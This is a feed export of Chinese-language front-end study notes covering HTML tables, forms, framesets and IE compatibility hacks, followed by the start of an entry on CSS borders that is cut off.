        <content type="html"><![CDATA[<h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>a1<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>a2<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>a3<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>b1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>b2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>b3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>b4<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>c1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>c2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>c3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><span id="more"></span><p>用table(块)创建表格</p><ul><li><p><code>tr</code>(row)代表一行</p></li><li><p><code>td</code>(data cell)代表单元格</p></li><li><p><code>th</code>(header cell)表头单元格</p></li><li><p><code>colspan</code>纵向合并</p></li><li><p><code>rowspan</code>横向合并</p></li></ul><blockquote><ul><li>table和td之间默认有一个距离，使用border-spacing可以设置这个距离</li><li>border-collapse可以合并表格的边框，设置之后border-spacing失效</li></ul></blockquote><p>合并单元格</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>b4<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br></pre></td></tr></table></figure><p> 隔行变色</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">tr</span><span class="selector-pseudo">:nth-child</span>(even)&#123;</span><br><span class="line">    <span class="attribute">background-color</span>:yellowgreen;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">tr</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>:red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*IE8不支持*/</span></span><br></pre></td></tr></table></figure><h2 id="长表格"><a href="#长表格" class="headerlink" title="长表格"></a>长表格</h2><p> 当表格过长时，需要将表格分为三部分，表头，表格的主题，表格底部</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>a1<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>a2<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>a3<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>a4<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>b1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>b2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>b3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> &gt;</span>b4<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tfoot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>c1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>c2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>c3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>c4<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tfoot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><p>三个标签来表示</p><ul><li>thead表头</li><li>tbody主体</li><li>tfoot表格底部</li></ul><p>特点</p><ul><li><p>区分表的不同部分</p></li><li><p>都是table的子标签</p></li><li><p>三者随便排序，它们总会按顺序显示</p></li></ul><ul><li><strong>如果没写tbody，浏览器会自己默认写上并将所有tr放入tbody</strong></li></ul><blockquote><p>已经过时的布局方式，表格列数以td最多的决定，表格可以嵌套，耦合程度高，不易维护</p></blockquote><h2 id="完善clearfix"><a href="#完善clearfix" class="headerlink" title="完善clearfix"></a>完善clearfix</h2><p>解决了高度塌陷和父子元素垂直外边距重叠问题</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span>:before,</span><br><span class="line">.clearfix:after&#123;</span><br><span class="line">content:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="attribute">display</span>:table;</span><br><span class="line"><span class="attribute">clear</span>:both;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*table对父子外边距重叠有效，也对高度塌陷有效*/</span></span><br></pre></td></tr></table></figure><h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>向服务器提交信息</p><ul><li><p>比如：注册 登录 百度搜索</p></li><li><p>使用<code>from</code>标签创建表单，用它提交不同的表单项</p></li></ul><h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">User<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">Password<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- submit表示提交，value可以自定义提交按钮名字。</span></span><br><span class="line"><span class="comment">在文本框里也可以指定value，它会作为默认值写在框里</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;注册&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p><code>form</code>必须指定<code>action</code>这个属性，它指向一个服务器地址，表单会提交给这个服务器</p></li><li><p>用户填写的信息会在url地址后面以查询字符串的形式发给服务器</p><ul><li><code>url?字符串</code></li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8848/demo01/target.html?username=ffff</span><br></pre></td></tr></table></figure><ul><li><p>多个名值对时</p><ul><li><code>属性名(name)=属性值&amp;属性名=属性值</code></li></ul></li><li><p>input为内联元素</p></li><li><p>也可以用button创建提交按钮(type值为submit)</p></li></ul><h3 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">性别<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;male&quot;</span> /&gt;</span>男</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;female&quot;</span> /&gt;</span>女</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>input创建单选按钮，<code>type</code>为<code>radio</code></li><li>通过<code>name</code>分组</li><li>需要用户选择的表单项，要有<code>value</code>(给服务器)，不然无法区分</li></ul><h3 id="多选框"><a href="#多选框" class="headerlink" title="多选框"></a>多选框</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">爱好 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;language&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Java&quot;</span>&gt;</span>Java</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;language&quot;</span> <span class="attr">value</span>=<span class="string">&quot;C&quot;</span>&gt;</span>C</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;language&quot;</span> <span class="attr">value</span>=<span class="string">&quot;C++&quot;</span>&gt;</span>C++</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;language&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Python&quot;</span>&gt;</span>Python</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>使用input的type为checkbox创建</li></ul><h3 id="下拉列表"><a href="#下拉列表" class="headerlink" title="下拉列表"></a>下拉列表</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">编程难受吗</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;coding&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span> =<span class="string">&quot;ok&quot;</span>&gt;</span>还行<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span> =<span class="string">&quot;ok2&quot;</span>&gt;</span>可以<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span> =<span class="string">&quot;?&quot;</span>&gt;</span>想哭<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span> =<span class="string">&quot;??&quot;</span>&gt;</span>难受<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>通过select创建,option创建列表项</li><li>name给select设置，value给option设置</li></ul><h3 id="默认选中"><a href="#默认选中" class="headerlink" title="默认选中"></a>默认选中</h3><ul><li>只需要将option添加selected=’selected’即可</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span> =<span class="string">&quot;ok2&quot;</span> <span class="attr">selected</span>=<span class="string">&#x27;selected&gt;可以&lt;/option&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li>或者在input加checked=’check’</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;language&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Java&quot;</span> <span class="attr">checked</span>=<span class="string">&#x27;check&#x27;</span>&gt;</span>Java</span><br></pre></td></tr></table></figure><ul><li>在select中添加multiple=’multiple’，变成多选下拉列表</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;coding&quot;</span> <span class="attr">multiple</span>=<span class="string">&#x27;multiple&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在select中使用optgroup（添加label进行分组名）对项进行分组，将option包起来</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">编程难受吗</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;coding&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">optgroup</span> <span class="attr">label</span>=<span class="string">&quot;自我感觉良好&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span> =<span class="string">&quot;ok&quot;</span>&gt;</span>还行<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span> =<span class="string">&quot;ok2&quot;</span>&gt;</span>可以<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">optgroup</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">optgroup</span> <span class="attr">label</span>=<span class="string">&quot;啥玩意&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span> =<span class="string">&quot;?&quot;</span>&gt;</span>想哭<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span> =<span class="string">&quot;??&quot;</span>&gt;</span>难受<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">optgroup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="标签创建文本域"><a href="#标签创建文本域" class="headerlink" title="标签创建文本域"></a>标签创建文本域</h3><p>使用<strong>textarea</strong>可以输入多行文本</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="按钮"><a href="#按钮" class="headerlink" title="按钮"></a>按钮</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span>&gt;</span>普通的按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span>&gt;</span>重置<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="重置按钮"><a href="#重置按钮" class="headerlink" title="重置按钮"></a>重置按钮</h4><ul><li>input的type值为reset</li><li>button的type属性值为reset</li></ul><h4 id="普通的按钮"><a href="#普通的按钮" class="headerlink" title="普通的按钮"></a>普通的按钮</h4><p>input的type值为button创建按钮</p><p>button的type值为button创建按钮</p><p>由于button是成对出现的标签，所以更加灵活</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li>提示文字一般都用label包起来，label有一个属性for，通过设值与文本的id值结合，点击文字也可以进入输入框</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;um&quot;</span>&gt;</span>User<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;um&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><ul><li>使用<code>fieldset</code>标签对表单进行分组<ul><li><code>legend</code>标签编辑分组名</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">legend</span>&gt;</span>用户信息<span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;um&quot;</span>&gt;</span>User<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;um&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Password<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="框架集"><a href="#框架集" class="headerlink" title="框架集"></a>框架集</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">frameset</span> <span class="attr">cols</span>=<span class="string">&quot;30%,*, 30%&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">&quot;float.html&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">&quot;form.html&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">frameset</span> <span class="attr">rows</span>=<span class="string">&quot;50%,50%&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">&quot;long table.html&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">&quot;navigation_bars.html&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>和内联框架相似，使用frameset创立</p></li><li><p>特点是可以引入多个页面（利用子标签frame）</p></li><li><p><code>ros</code>水平排列</p></li><li><p><code>clos</code>垂直排列</p></li><li><p>必须设置一个，不然只能加载一个页面</p></li></ul><ul><li>框架集与body不能共存</li></ul><ul><li>frameset可以嵌套使用</li></ul><ul><li>内容不会被检索，而且不能有自己的内容，而且每单独加载一个页面就要加载一个请求</li></ul><blockquote><p>毒瘤IE6不支持png24，需要使用png8才能透明</p></blockquote><h2 id="条件hack"><a href="#条件hack" class="headerlink" title="条件hack"></a>条件hack</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--<span class="selector-attr">[if IE 6]</span>&gt;</span><br><span class="line">&lt;<span class="selector-tag">p</span>&gt;请远离IE6，谢谢配合&lt;/<span class="selector-tag">p</span>&gt;</span><br><span class="line">&lt;!<span class="selector-attr">[endif]</span>--&gt;</span><br></pre></td></tr></table></figure><p>因为有一些代码在某些浏览器需要执行，儿某些浏览器不需要执行，这时用</p><p>到css-hack</p><ul><li><p>只对IE10以下有效，其他浏览器会识别为注释</p></li><li><p><code>if</code>后面可以加一个<code>lt，gt，lte，gte，!</code></p></li></ul><h2 id="属性hack"><a href="#属性hack" class="headerlink" title="属性hack"></a>属性hack</h2><p>针对IE浏览器的，尽量不用，具体查w3cschool</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_background-<span class="attribute">color</span>:red;</span><br><span class="line">*<span class="attribute">background-color</span>:red;</span><br><span class="line"><span class="attribute">background-color</span>:red\<span class="number">0</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> HTML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 表格 </tag>
            
            <tag> 表单 </tag>
            
            <tag> 框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>盒子模型与定位</title>
      <link href="/Front-end/CSS/2.%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B%E4%B8%8E%E5%AE%9A%E4%BD%8D.html"/>
      <url>/Front-end/CSS/2.%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B%E4%B8%8E%E5%AE%9A%E4%BD%8D.html</url>
      
        <content type="html"><![CDATA[<h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><p>CSS在处理网页时，认为每个元素是一个盒子，网络布局就相当于摆放盒子</p><span id="more"></span><h3 id="边框"><a href="#边框" class="headerlink" title="边框"></a>边框</h3><p>边框里面由内边距和内容区</p><ul><li>设置边框，必须指定三个样式，宽度和颜色和样式 </li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#008000</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">border-width</span>:<span class="number">10px</span> ;</span><br><span class="line">    <span class="attribute">border-color</span>: <span class="number">#FF0000</span>;</span><br><span class="line">    <span class="attribute">border-style</span>:solid ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>分别设置每个边框的宽度，颜色，样式</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*&#123;上 右 下 左&#125;</span></span><br><span class="line"><span class="comment">&#123;上 左右 下&#125;</span></span><br><span class="line"><span class="comment">&#123;上下 左右&#125;</span></span><br><span class="line"><span class="comment">&#123;上下左右&#125;*/</span></span><br><span class="line"><span class="comment">/*第一种形式*/</span></span><br><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="attribute">border-width</span>: <span class="number">10px</span> <span class="number">20px</span> <span class="number">10px</span> <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">border-color</span>:  red green black blue;</span><br><span class="line">    <span 